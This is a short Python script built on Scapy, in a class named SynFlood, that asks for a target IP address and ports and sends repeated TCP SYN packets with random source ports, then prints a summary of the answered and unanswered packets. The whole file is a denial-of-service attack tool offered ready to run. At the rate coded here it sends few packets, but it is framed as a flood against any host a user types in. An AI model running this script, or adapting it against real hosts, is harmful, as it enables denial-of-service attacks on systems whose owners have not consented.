from scapy.all import *
from scapy.layers.inet import *

class SynFlood():
    def __init__(self):
        pass

    def flood(self):

        destination = input("destination IP: ")
        ports = input("Port(s) //seperate by blank-space if more than one : ")
        port = ports.split()

        p = IP(dst=destination, id=1111, ttl=99) / TCP(sport=RandShort(), dport=port[0:len(port)], seq=12345, ack=1000, window=1000, flags="S")
        ls(p)
        print("Sending Packets in 0.3 second intervals for timeout of 4 sec \n")
        ans, unans = srloop(p, inter=0.3, retry=2, timeout=4)
        print("Summary of answered & unanswered packets: \n")
        ans.summary()
        unans.summary()



syn = SynFlood()
syn.flood()
